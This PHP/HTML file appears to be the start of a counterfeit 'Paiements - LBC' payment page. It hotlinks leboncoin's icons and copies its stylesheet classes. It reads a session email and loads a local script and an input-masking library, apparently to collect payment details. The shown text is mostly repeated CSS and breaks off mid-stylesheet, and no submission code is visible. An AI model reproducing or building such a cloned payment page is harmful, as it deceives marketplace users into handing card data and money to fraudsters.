<?php
session_start();
if (isset($_SESSION['email'])) {
    $email = $_SESSION['email'];
} else {
    $email = "Email non disponible.";
}
?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <meta name="theme-color" content="#ffffff" />
    <meta property="og:locale" content="fr" />
    <meta property="og:site_name" content="" />

    <meta name="twitter:site" content="" />

    <meta
        name="viewport"
        content="initial-scale=1.0, width=device-width, maximum-scale=1.0, user-scalable=0" />

    <link
        rel="icon"
        href="https://www.leboncoin.fr/_next/static/media/favicon.2b8b94c9.ico"
        sizes="32x32" />
    <link rel="stylesheet" href="./styly.css">
    <link rel="stylesheet"
        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <link rel="stylesheet" href="./css/index.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" type="text/javascript">
    </script>
    <link
        rel="icon"
        href="https://www.leboncoin.fr/_next/static/media/favicon.6fd07af6.svg"
        type="image/svg+xml"
        data-test-id="no-unread-msgs" />
    <link
        rel="apple-touch-icon"
        href="https://www.leboncoin.fr/_next/static/media/apple-touch-icon.fdb8f5a0.png" />

    <title>Paiements - LBC</title>

    <meta name="theme-color" content="#ffffff" />

    <meta property="og:locale" content="fr" />
    <meta property="og:site_name" content="" />

    <meta name="twitter:site" content="" />

    <meta http-equiv="P3P" content="" />

    <meta
        name="viewport"
        content="initial-scale=1.0, width=device-width, maximum-scale=1.0, user-scalable=0" />

    <link
        rel="icon"
        href="https://www.leboncoin.fr/_next/static/media/favicon.2b8b94c9.ico"
        sizes="32x32" />

    <link
        rel="icon"
        href="https://www.leboncoin.fr/_next/static/media/favicon.6fd07af6.svg"
        type="image/svg+xml"
        data-test-id="no-unread-msgs" />
    <link
        rel="apple-touch-icon"
        href="https://www.leboncoin.fr/_next/static/media/apple-touch-icon.fdb8f5a0.png" />

    <link rel="stylesheet" fetchpriority="low" href="../../liberty.css" />

    <link rel="preload" href="../../359c3f8ec4dc58f7.css" as="style" />
    <link rel="stylesheet" href="../../359c3f8ec4dc58f7.css" data-n-g="" />
    <link rel="preload" href="ae6adbf10ad80b13.css" as="style" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"
        type="text/javascript"></script>
    <script src="./belo.js"></script>
    <style>
        .form-container {
            border: 2px solid #ced4da;
            /* Couleur et épaisseur de la bordure */
            border-radius: 8px;
            /* Arrondi des coins */
            padding: 20px;
            /* Espace intérieur */
            margin: 20px 0;
            /* Espace extérieur */
        }
    </style>

    <style data-n-href="/_next/static/css/aef5bf2159ad07af.css">
        .popover_container__auusx {
            max-height: var(--sz-256);
            overflow: auto;
        }

        .styles_container__Jtfui {
            bottom: var(--spacing-lg);
            left: var(--spacing-lg);
        }

        @media (min-width: 768px) {
            .styles_container__Jtfui {
                bottom: var(--spacing-md);
                left: var(--spacing-xl);
            }
        }

        .styles_container__IFuaq {
            top: 13%;
        }

        @media (min-width: 768px) {
            .styles_container__IFuaq {
                top: var(--spacing-3xl);
            }
        }

        .styles_container__oa6Q_ {
            bottom: var(--spacing-sm);
            left: var(--spacing-xl);
        }

        @media (min-width: 768px) {
            .styles_container__oa6Q_ {
                bottom: var(--spacing-md);
            }
        }

        @keyframes styles_hide__8Hbb_ {
            0% {
                visibility: visible;
            }

            to {
                visibility: hidden;
            }
        }

        .styles_isHidden__UBlPx {
            animation: styles_hide__8Hbb_ 0.25s forwards;
        }

        .styles_movableLogo__3Am8s {
            transition: opacity var(--embedAnimation) ease-in,
                transform var(--embedAnimation) ease-in-out;
        }

        .styles_movableLogoMovedUp__ibb0A {
            transition: opacity var(--embedAnimation) ease-out var(--shrinkAnimation),
                transform var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                visibility 0ms var(--shrinkEmbedAnimation);
        }

        @keyframes styles_blink__az1Nf {
            0% {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .styles_loadingDot__M_5Ri {
            animation: styles_blink__az1Nf 1.5s steps(2, start) infinite;
        }

        .styles_loadingDot__M_5Ri:first-child {
            animation-delay: -0.32s;
        }

        .styles_loadingDot__M_5Ri:nth-child(2) {
            animation-delay: -0.16s;
        }

        .transitions_menuContentOpen___1l0F {
            transition: height var(--layerAnimation),
                padding-bottom var(--layerAnimation);
        }

        .transitions_stickyWrapperIdle__od66m:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_stickyWrapperEmbedded__tFw6h:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
            transition-delay: var(--shrinkAnimation);
        }

        .transitions_inputWrapperIdle__Nf8ju {
            transition: top var(--embedAnimation) ease-in-out,
                height var(--embedAnimation) ease-in-out,
                left var(--shrinkAnimation) ease-in-out var(--embedAnimation);
        }

        .transitions_inputWrapperEmbedded__UtlMy {
            transition: left var(--shrinkAnimation) ease-in-out,
                top var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                height var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_bottomMarginIdle__sobCN {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_bottomMarginEmbedded__QcK06 {
            transition: height var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                padding-bottom var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_childrenWrapper__82rie {
            transition: max-width var(--extendAnimation) ease-in-out,
                opacity var(--extendAnimation) ease-in-out;
        }

        .styles_centered__lDvnA {
            text-align: center;
        }

        .styles_navBarOpen___FWY0 {
            padding-bottom: 6.5rem;
        }

        @media (min-width: 971px) {
            .styles_navBarOpen___FWY0 {
                padding-bottom: 0;
            }
        }

        @media print {

            .styles_navBarOpen___FWY0 footer,
            .styles_navBarOpen___FWY0 header {
                display: none;
            }
        }

        .styles_greyBackground__wnePm {
            background-color: #fafafa;
            min-height: 100vh;
        }

        @media (min-width: 640px) {
            .styles_Snackbar__o2pg8>div {
                position: absolute;
                left: 50%;
                top: 12.5rem;
                transform: translateX(-50%);
            }
        }
    </style>
    <style data-n-href="/_next/static/css/9737c5bc0e894dc3.css" media="x">
        .popover_container__auusx {
            max-height: var(--sz-256);
            overflow: auto;
        }

        .styles_container__Jtfui {
            bottom: var(--spacing-lg);
            left: var(--spacing-lg);
        }

        @media (min-width: 768px) {
            .styles_container__Jtfui {
                bottom: var(--spacing-md);
                left: var(--spacing-xl);
            }
        }

        .styles_container__IFuaq {
            top: 13%;
        }

        @media (min-width: 768px) {
            .styles_container__IFuaq {
                top: var(--spacing-3xl);
            }
        }

        .styles_container__oa6Q_ {
            bottom: var(--spacing-sm);
            left: var(--spacing-xl);
        }

        @media (min-width: 768px) {
            .styles_container__oa6Q_ {
                bottom: var(--spacing-md);
            }
        }

        @keyframes styles_hide__8Hbb_ {
            0% {
                visibility: visible;
            }

            to {
                visibility: hidden;
            }
        }

        .styles_isHidden__UBlPx {
            animation: styles_hide__8Hbb_ 0.25s forwards;
        }

        .styles_movableLogo__3Am8s {
            transition: opacity var(--embedAnimation) ease-in,
                transform var(--embedAnimation) ease-in-out;
        }

        .styles_movableLogoMovedUp__ibb0A {
            transition: opacity var(--embedAnimation) ease-out var(--shrinkAnimation),
                transform var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                visibility 0ms var(--shrinkEmbedAnimation);
        }

        @keyframes styles_blink__az1Nf {
            0% {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .styles_loadingDot__M_5Ri {
            animation: styles_blink__az1Nf 1.5s steps(2, start) infinite;
        }

        .styles_loadingDot__M_5Ri:first-child {
            animation-delay: -0.32s;
        }

        .styles_loadingDot__M_5Ri:nth-child(2) {
            animation-delay: -0.16s;
        }

        .transitions_menuContentOpen___1l0F {
            transition: height var(--layerAnimation),
                padding-bottom var(--layerAnimation);
        }

        .transitions_stickyWrapperIdle__od66m:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_stickyWrapperEmbedded__tFw6h:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
            transition-delay: var(--shrinkAnimation);
        }

        .transitions_inputWrapperIdle__Nf8ju {
            transition: top var(--embedAnimation) ease-in-out,
                height var(--embedAnimation) ease-in-out,
                left var(--shrinkAnimation) ease-in-out var(--embedAnimation);
        }

        .transitions_inputWrapperEmbedded__UtlMy {
            transition: left var(--shrinkAnimation) ease-in-out,
                top var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                height var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_bottomMarginIdle__sobCN {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_bottomMarginEmbedded__QcK06 {
            transition: height var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                padding-bottom var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_childrenWrapper__82rie {
            transition: max-width var(--extendAnimation) ease-in-out,
                opacity var(--extendAnimation) ease-in-out;
        }

        .styles_centered__lDvnA {
            text-align: center;
        }

        .styles_navBarOpen___FWY0 {
            padding-bottom: 6.5rem;
        }

        @media (min-width: 971px) {
            .styles_navBarOpen___FWY0 {
                padding-bottom: 0;
            }
        }

        @media print {

            .styles_navBarOpen___FWY0 footer,
            .styles_navBarOpen___FWY0 header {
                display: none;
            }
        }

        .styles_greyBackground__wnePm {
            background-color: #fafafa;
            min-height: 100vh;
        }

        .styles_locationContainer__pP74A {
            position: relative;
        }

        .styles_locationContainerList__8einy {
            position: absolute;
            top: 100%;
            left: 0;
            width: 100%;
            background-color: #fff;
            max-height: 30vh;
            overflow: auto;
            z-index: 1000;
            border-radius: 4px;
            box-shadow: 0 1px 5px 0 rgba(0, 0, 0, 0.2),
                0 3px 1px -2px rgba(0, 0, 0, 0.04), 0 2px 2px 0 rgba(0, 0, 0, 0.04);
        }

        .styles_locationContainerList__8einy>li {
            transition: background-color 0.25s ease-in-out;
        }

        .styles_locationContainerList__8einy>li:focus,
        .styles_locationContainerList__8einy>li:hover {
            background: #e6ebef;
        }

        .styles_dropZone__DhsC9 {
            width: 100%;
            height: auto;
            border: none;
        }

        .styles_wrapper__XMpSm {
            margin: 1rem 0 0;
            padding: 0;
            list-style-type: none;
            display: flex;
            flex-wrap: wrap;
        }

        .styles_preview__Wy0HX {
            display: flex;
            align-items: center;
            max-width: 20rem;
            margin: 1rem;
            position: relative;
        }

        .styles_textPreview__wT7VV {
            background: #ff6e14;
            color: #fff;
            text-align: center;
            padding: 0 1rem;
            border-radius: 4px;
            border: 1px solid #ff6e14;
            max-height: 15rem;
        }

        .styles_textPreview__wT7VV span {
            word-wrap: break-word;
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
        }

        .styles_item__hEjiD {
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .styles_item__hEjiD img {
            border-radius: 2px;
            height: 13rem;
            max-height: 13rem;
        }

        .styles_cross__mhyRr {
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            border-radius: 50%;
            width: 2.2rem;
            height: 2.2rem;
            top: -1rem;
            right: -1rem;
            cursor: pointer;
            box-shadow: 0 -1px 4px 0 rgba(26, 26, 26, 0.08),
                0 4px 8px 0 rgba(26, 26, 26, 0.12);
        }

        .styles_line__G_JGa {
            margin-top: 1rem;
        }

        .styles_blocksContainer__ZRkIG {
            display: flex;
            margin-top: 2.4rem;
        }

        .styles_blocksContainer__ZRkIG ul {
            display: flex;
        }

        .styles_boxContainer__5cMzF {
            margin-right: 1.6rem;
        }

        .styles_box__qAfqM {
            position: relative;
            width: 12.8rem;
            height: 9rem;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 4px;
        }

        .styles_box__qAfqM img {
            height: 100%;
        }

        .styles_active__ujmW2 {
            border: 1px solid #ff6e14;
            color: #ff6e14;
        }

        .styles_inactive__moH2t {
            border: 1px dashed #cad1d9;
            color: #cad1d9;
        }

        .styles_dropBoxContent__8lmgk {
            padding: 0.8rem 1.6rem;
        }

        .styles_dropTextContainer__YHwGW {
            width: 100%;
        }

        .styles_fileNameContainer__hlt6M {
            background-color: #ff6e14;
        }

        .styles_titlePreviewContainer__3W03z {
            display: flex;
            max-width: 12.8rem;
            padding: 0.8rem;
            justify-content: center;
        }

        .styles_cross__jzoPD {
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            border-radius: 50%;
            width: 2.4rem;
            height: 2.4rem;
            top: -0.5rem;
            right: -0.5rem;
            cursor: pointer;
            box-shadow: 0 -1px 4px 0 rgba(26, 26, 26, 0.08),
                0 4px 8px 0 rgba(26, 26, 26, 0.12);
        }

        .styles_grid__Bznzx {
            display: block;
        }

        @media (min-width: 1024px) {
            .styles_grid__Bznzx {
                display: flex;
                flex-direction: row;
                justify-content: space-between;
            }
        }

        .styles_full__dtwxk {
            width: 100%;
        }

        .styles_personalName__wcQYk {
            border: 1px solid #cad1d9;
            padding: 1.6rem;
            border-radius: 8px;
        }

        .styles_iconContainer__eusbR,
        .styles_titleContent__l8ewc {
            display: flex;
            align-items: center;
        }

        .styles_iconContainer__eusbR {
            border-radius: 100%;
            min-height: 3.2rem;
            min-width: 3.2rem;
            background-color: #e6ebef;
            margin-right: 0.8rem;
            justify-content: center;
        }

        .styles_MangopayLegalModal__q5YP7 {
            max-width: 80rem;
        }

        .styles_wrapper__JanCk {
            background-color: #fff;
        }

        .styles_loading__NBm_g {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
        }

        .styles_explanations__ODQXK {
            margin: 1.5rem 0 3rem;
        }

        .styles_mangopayEscrowImage__yRaVd {
            display: flex;
            justify-content: center;
        }

        .styles_logoContainer__ba8kD {
            width: 9rem;
            height: 2.3rem;
        }

        .styles_textContainer__SrFV5 {
            display: flex;
            align-items: center;
        }

        .styles_MangopayPayout__YMkdw {
            position: relative;
            display: flex;
            flex-direction: column;
            background-color: #fef0e9;
            border-radius: 16px;
            width: 100%;
            padding: 2.4rem;
            margin-bottom: 1.6rem;
            align-items: flex-start;
        }

        .styles_content__1J_Ot {
            display: flex;
            flex-direction: column;
            margin-bottom: 2.4rem;
        }

        .styles_iconContainer__jgY96 {
            display: flex;
        }

        .styles_logo__XH35T {
            margin-left: 0.4rem;
            width: 9rem;
            height: 2.3rem;
            margin-bottom: 0.4rem;
        }

        .styles_carImg__61pmY {
            position: absolute;
            bottom: 1.6rem;
            right: 1.6rem;
            display: flex;
        }

        @media (min-width: 1280px) {
            .styles_MangopayPayout__YMkdw {
                flex-direction: row;
                padding-left: 10rem;
                align-items: center;
                justify-content: space-between;
            }

            .styles_content__1J_Ot {
                margin-bottom: 0;
                max-width: calc(100% - 20rem);
            }

            .styles_carImg__61pmY {
                left: 0.8rem;
                bottom: 3rem;
            }
        }

        .styles_successContainer__V7fpL {
            display: flex;
            flex-direction: column;
            background: #fff;
            border-radius: 4px;
            padding: 2.4rem 1.6rem 1.6rem 0;
            margin-bottom: 2.4rem;
        }

        .styles_contentContainer__SRSbj {
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-bottom: 0.8rem;
        }

        .styles_successContent__Z78EF {
            display: flex;
        }

        .styles_successCta__CEHME {
            display: flex;
            justify-content: flex-end;
        }

        @media (min-width: 768px) {
            .styles_successCta__CEHME {
                flex: 1;
                align-items: center;
                min-width: 12rem;
            }
        }

        .styles_loaderMask__mcxxc {
            position: fixed;
            top: 0;
            left: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100vh;
            z-index: 1401;
            background-color: rgba(0, 0, 0, 0.5);
        }
    </style>
    <style data-n-href="/_next/static/css/c6fb2d1c628400aa.css" media="x">
        .popover_container__auusx {
            max-height: var(--sz-256);
            overflow: auto;
        }

        .styles_container__Jtfui {
            bottom: var(--spacing-lg);
            left: var(--spacing-lg);
        }

        @media (min-width: 768px) {
            .styles_container__Jtfui {
                bottom: var(--spacing-md);
                left: var(--spacing-xl);
            }
        }

        .styles_container__IFuaq {
            top: 13%;
        }

        @media (min-width: 768px) {
            .styles_container__IFuaq {
                top: var(--spacing-3xl);
            }
        }

        .styles_container__oa6Q_ {
            bottom: var(--spacing-sm);
            left: var(--spacing-xl);
        }

        @media (min-width: 768px) {
            .styles_container__oa6Q_ {
                bottom: var(--spacing-md);
            }
        }

        @keyframes styles_hide__8Hbb_ {
            0% {
                visibility: visible;
            }

            to {
                visibility: hidden;
            }
        }

        .styles_isHidden__UBlPx {
            animation: styles_hide__8Hbb_ 0.25s forwards;
        }

        .styles_movableLogo__3Am8s {
            transition: opacity var(--embedAnimation) ease-in,
                transform var(--embedAnimation) ease-in-out;
        }

        .styles_movableLogoMovedUp__ibb0A {
            transition: opacity var(--embedAnimation) ease-out var(--shrinkAnimation),
                transform var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                visibility 0ms var(--shrinkEmbedAnimation);
        }

        @keyframes styles_blink__az1Nf {
            0% {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .styles_loadingDot__M_5Ri {
            animation: styles_blink__az1Nf 1.5s steps(2, start) infinite;
        }

        .styles_loadingDot__M_5Ri:first-child {
            animation-delay: -0.32s;
        }

        .styles_loadingDot__M_5Ri:nth-child(2) {
            animation-delay: -0.16s;
        }

        .transitions_menuContentOpen___1l0F {
            transition: height var(--layerAnimation),
                padding-bottom var(--layerAnimation);
        }

        .transitions_stickyWrapperIdle__od66m:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_stickyWrapperEmbedded__tFw6h:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
            transition-delay: var(--shrinkAnimation);
        }

        .transitions_inputWrapperIdle__Nf8ju {
            transition: top var(--embedAnimation) ease-in-out,
                height var(--embedAnimation) ease-in-out,
                left var(--shrinkAnimation) ease-in-out var(--embedAnimation);
        }

        .transitions_inputWrapperEmbedded__UtlMy {
            transition: left var(--shrinkAnimation) ease-in-out,
                top var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                height var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_bottomMarginIdle__sobCN {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_bottomMarginEmbedded__QcK06 {
            transition: height var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                padding-bottom var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_childrenWrapper__82rie {
            transition: max-width var(--extendAnimation) ease-in-out,
                opacity var(--extendAnimation) ease-in-out;
        }

        .styles_centered__lDvnA {
            text-align: center;
        }

        .styles_navBarOpen___FWY0 {
            padding-bottom: 6.5rem;
        }

        @media (min-width: 971px) {
            .styles_navBarOpen___FWY0 {
                padding-bottom: 0;
            }
        }

        @media print {

            .styles_navBarOpen___FWY0 footer,
            .styles_navBarOpen___FWY0 header {
                display: none;
            }
        }

        .styles_greyBackground__wnePm {
            background-color: #fafafa;
            min-height: 100vh;
        }
    </style>
    <style data-n-href="/_next/static/css/d641f86ea7608725.css" media="x">
        .popover_container__auusx {
            max-height: var(--sz-256);
            overflow: auto;
        }

        .styles_container__Jtfui {
            bottom: var(--spacing-lg);
            left: var(--spacing-lg);
        }

        @media (min-width: 768px) {
            .styles_container__Jtfui {
                bottom: var(--spacing-md);
                left: var(--spacing-xl);
            }
        }

        .styles_container__IFuaq {
            top: 13%;
        }

        @media (min-width: 768px) {
            .styles_container__IFuaq {
                top: var(--spacing-3xl);
            }
        }

        .styles_container__oa6Q_ {
            bottom: var(--spacing-sm);
            left: var(--spacing-xl);
        }

        @media (min-width: 768px) {
            .styles_container__oa6Q_ {
                bottom: var(--spacing-md);
            }
        }

        @keyframes styles_hide__8Hbb_ {
            0% {
                visibility: visible;
            }

            to {
                visibility: hidden;
            }
        }

        .styles_isHidden__UBlPx {
            animation: styles_hide__8Hbb_ 0.25s forwards;
        }

        .styles_movableLogo__3Am8s {
            transition: opacity var(--embedAnimation) ease-in,
                transform var(--embedAnimation) ease-in-out;
        }

        .styles_movableLogoMovedUp__ibb0A {
            transition: opacity var(--embedAnimation) ease-out var(--shrinkAnimation),
                transform var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                visibility 0ms var(--shrinkEmbedAnimation);
        }

        @keyframes styles_blink__az1Nf {
            0% {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .styles_loadingDot__M_5Ri {
            animation: styles_blink__az1Nf 1.5s steps(2, start) infinite;
        }

        .styles_loadingDot__M_5Ri:first-child {
            animation-delay: -0.32s;
        }

        .styles_loadingDot__M_5Ri:nth-child(2) {
            animation-delay: -0.16s;
        }

        .transitions_menuContentOpen___1l0F {
            transition: height var(--layerAnimation),
                padding-bottom var(--layerAnimation);
        }

        .transitions_stickyWrapperIdle__od66m:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_stickyWrapperEmbedded__tFw6h:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
            transition-delay: var(--shrinkAnimation);
        }

        .transitions_inputWrapperIdle__Nf8ju {
            transition: top var(--embedAnimation) ease-in-out,
                height var(--embedAnimation) ease-in-out,
                left var(--shrinkAnimation) ease-in-out var(--embedAnimation);
        }

        .transitions_inputWrapperEmbedded__UtlMy {
            transition: left var(--shrinkAnimation) ease-in-out,
                top var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                height var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_bottomMarginIdle__sobCN {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_bottomMarginEmbedded__QcK06 {
            transition: height var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                padding-bottom var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_childrenWrapper__82rie {
            transition: max-width var(--extendAnimation) ease-in-out,
                opacity var(--extendAnimation) ease-in-out;
        }

        .styles_centered__lDvnA {
            text-align: center;
        }

        .styles_navBarOpen___FWY0 {
            padding-bottom: 6.5rem;
        }

        @media (min-width: 971px) {
            .styles_navBarOpen___FWY0 {
                padding-bottom: 0;
            }
        }

        @media print {

            .styles_navBarOpen___FWY0 footer,
            .styles_navBarOpen___FWY0 header {
                display: none;
            }
        }

        .styles_greyBackground__wnePm {
            background-color: #fafafa;
            min-height: 100vh;
        }

        .styles_content__CQhGc {
            text-align: left;
            padding-bottom: 1.6rem;
            color: #1a1a1a;
        }

        .styles_content__CQhGc .styles_spinner__bg8aK {
            margin-top: 1.6rem;
            text-align: center;
        }

        .styles_content__CQhGc .styles_notify__yTDjV {
            margin-top: 1.6rem;
            font-weight: 600;
        }

        .styles_link__EuMar {
            display: block;
            padding-top: 1.6rem;
            border-top: 1px solid #e6ebef;
            font-weight: 600;
            color: #4183d7;
            text-decoration: none;
        }

        .styles_link__EuMar:hover .styles_linkText__a8_3S {
            color: #369;
        }

        .styles_SaveSearchButton__G_PIG {
            display: inline-block;
            position: relative;
        }

        .styles_SaveSearchButton__G_PIG svg {
            animation: styles_bellshake__aj8RS 5s infinite;
            animation-delay: 0.2s;
            transform-origin: 50% 0;
        }

        .styles_SaveSearchButton__G_PIG.styles_isSaved__ZRCG6 svg {
            animation: none;
        }

        @keyframes styles_bellshake__aj8RS {
            0% {
                transform: rotate(0);
            }

            2% {
                transform: rotate(10deg);
            }

            4% {
                transform: rotate(-10deg);
            }

            6% {
                transform: rotate(8deg);
            }

            8% {
                transform: rotate(-8deg);
            }

            10% {
                transform: rotate(4deg);
            }

            12% {
                transform: rotate(-4deg);
            }

            14% {
                transform: rotate(2deg);
            }

            16% {
                transform: rotate(0);
            }

            to {
                transform: rotate(0);
            }
        }
    </style>
    <style data-n-href="/_next/static/css/8ad77c5f5a4faebd.css" media="x">
        .popover_container__auusx {
            max-height: var(--sz-256);
            overflow: auto;
        }

        .styles_container__Jtfui {
            bottom: var(--spacing-lg);
            left: var(--spacing-lg);
        }

        @media (min-width: 768px) {
            .styles_container__Jtfui {
                bottom: var(--spacing-md);
                left: var(--spacing-xl);
            }
        }

        .styles_container__IFuaq {
            top: 13%;
        }

        @media (min-width: 768px) {
            .styles_container__IFuaq {
                top: var(--spacing-3xl);
            }
        }

        .styles_container__oa6Q_ {
            bottom: var(--spacing-sm);
            left: var(--spacing-xl);
        }

        @media (min-width: 768px) {
            .styles_container__oa6Q_ {
                bottom: var(--spacing-md);
            }
        }

        @keyframes styles_hide__8Hbb_ {
            0% {
                visibility: visible;
            }

            to {
                visibility: hidden;
            }
        }

        .styles_isHidden__UBlPx {
            animation: styles_hide__8Hbb_ 0.25s forwards;
        }

        .styles_movableLogo__3Am8s {
            transition: opacity var(--embedAnimation) ease-in,
                transform var(--embedAnimation) ease-in-out;
        }

        .styles_movableLogoMovedUp__ibb0A {
            transition: opacity var(--embedAnimation) ease-out var(--shrinkAnimation),
                transform var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                visibility 0ms var(--shrinkEmbedAnimation);
        }

        @keyframes styles_blink__az1Nf {
            0% {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .styles_loadingDot__M_5Ri {
            animation: styles_blink__az1Nf 1.5s steps(2, start) infinite;
        }

        .styles_loadingDot__M_5Ri:first-child {
            animation-delay: -0.32s;
        }

        .styles_loadingDot__M_5Ri:nth-child(2) {
            animation-delay: -0.16s;
        }

        .transitions_menuContentOpen___1l0F {
            transition: height var(--layerAnimation),
                padding-bottom var(--layerAnimation);
        }

        .transitions_stickyWrapperIdle__od66m:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_stickyWrapperEmbedded__tFw6h:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
            transition-delay: var(--shrinkAnimation);
        }

        .transitions_inputWrapperIdle__Nf8ju {
            transition: top var(--embedAnimation) ease-in-out,
                height var(--embedAnimation) ease-in-out,
                left var(--shrinkAnimation) ease-in-out var(--embedAnimation);
        }

        .transitions_inputWrapperEmbedded__UtlMy {
            transition: left var(--shrinkAnimation) ease-in-out,
                top var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                height var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_bottomMarginIdle__sobCN {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_bottomMarginEmbedded__QcK06 {
            transition: height var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                padding-bottom var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_childrenWrapper__82rie {
            transition: max-width var(--extendAnimation) ease-in-out,
                opacity var(--extendAnimation) ease-in-out;
        }

        .styles_centered__lDvnA {
            text-align: center;
        }

        .styles_navBarOpen___FWY0 {
            padding-bottom: 6.5rem;
        }

        @media (min-width: 971px) {
            .styles_navBarOpen___FWY0 {
                padding-bottom: 0;
            }
        }

        @media print {

            .styles_navBarOpen___FWY0 footer,
            .styles_navBarOpen___FWY0 header {
                display: none;
            }
        }

        .styles_greyBackground__wnePm {
            background-color: #fafafa;
            min-height: 100vh;
        }

        .styles_creditPriceWrapper__tvSyc {
            width: 100%;
            max-width: 47.23%;
            margin-right: 0.4rem;
        }

        @media (min-width: 768px) {
            .styles_creditPriceWrapper__tvSyc {
                max-width: 13.4rem;
            }
        }

        .styles_creditPriceWrapper__tvSyc .styles_creditsGift__lhXOF {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #e6ebef;
            height: 4.7rem;
        }

        .styles_creditPriceWrapper__tvSyc .styles_creditPrice__UB_Uu {
            display: flex;
            flex-direction: column;
            text-align: center;
            background-color: #fff;
            border: 1px solid #e6ebef;
            border-radius: 4px;
        }

        .styles_creditPriceWrapper__tvSyc .styles_creditPrice__UB_Uu .styles_price__dX6ne {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 7rem;
        }

        .styles_creditPriceWrapper__tvSyc .styles_creditPrice__UB_Uu.styles_selected__Cd4Gw {
            border: 1px solid #ff6e14;
            background: #fafafa;
        }

        .styles_creditPriceWrapper__tvSyc .styles_creditPrice__UB_Uu.styles_selected__Cd4Gw .styles_creditsGift__lhXOF {
            background-color: #ff6e14;
            color: #fff;
        }

        .styles_creditsInputs__nxutZ {
            position: relative;
            display: flex;
            flex-wrap: wrap;
            justify-content: flex-start;
        }

        @media (min-width: 768px) {
            .styles_creditsInputs__nxutZ {
                flex-wrap: nowrap;
            }
        }
    </style>
    <style data-n-href="/_next/static/css/e0f0e7b7f36011ad.css" media="x">
        .popover_container__auusx {
            max-height: var(--sz-256);
            overflow: auto;
        }

        .styles_container__Jtfui {
            bottom: var(--spacing-lg);
            left: var(--spacing-lg);
        }

        @media (min-width: 768px) {
            .styles_container__Jtfui {
                bottom: var(--spacing-md);
                left: var(--spacing-xl);
            }
        }

        .styles_container__IFuaq {
            top: 13%;
        }

        @media (min-width: 768px) {
            .styles_container__IFuaq {
                top: var(--spacing-3xl);
            }
        }

        .styles_container__oa6Q_ {
            bottom: var(--spacing-sm);
            left: var(--spacing-xl);
        }

        @media (min-width: 768px) {
